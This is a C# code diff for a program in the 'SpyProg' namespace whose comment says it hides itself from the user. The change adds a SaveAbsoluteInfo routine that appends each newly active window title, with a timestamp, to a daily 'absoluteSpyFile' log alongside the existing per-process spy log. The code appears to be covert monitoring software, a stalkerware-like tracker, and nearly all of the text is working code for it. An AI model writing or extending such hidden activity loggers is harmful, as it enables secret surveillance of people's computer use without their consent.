@@ -30,6 +30,7 @@ namespace SpyProg {
         }
 
         private string NewFilePath => Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"spyFile({DateTime.Now.ToString("dd-MM-yyyy_HH-mm-ss")}).txt");
+        private string NewAbsSpyFilePath => Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"absoluteSpyFile({DateTime.Now.ToString("dd-MM-yyyy")}).txt");
 
         // hide application from user
         private void OnFormLoad(object sender, EventArgs e) {
@@ -48,6 +49,8 @@ namespace SpyProg {
                     }
 
                     currWindow = WinApi.GetActiveWindowName();
+                    SaveAbsoluteInfo();
+
                     string currProc = ProcRestrict(currWindow);
                     string prevProc = ProcRestrict(prevWindow);
 
@@ -68,6 +71,7 @@ namespace SpyProg {
                     if (currProc != null)
                         SaveSpyInfo(currProc);
 
+                    SaveAbsoluteInfo();
                     currWindow = "";
                     prevWindow = "";
                     spyFilePath = "";
@@ -92,6 +96,14 @@ namespace SpyProg {
             using (StreamWriter sw = new StreamWriter(spyFilePath, false)) {
                 foreach (var p in procDict) {
                     sw.WriteLine($"{p.Key} - {p.Value}");
+                }
+            }
+        }
+
+        private void SaveAbsoluteInfo() {
+            if(!string.IsNullOrEmpty(currWindow) && prevWindow != currWindow) {
+                using (StreamWriter sw = System.IO.File.AppendText(NewAbsSpyFilePath)) {
+                    sw.WriteLine($"{DateTime.Now.ToString("HH:mm:ss")} - {currWindow}");
                 }
             }
         }
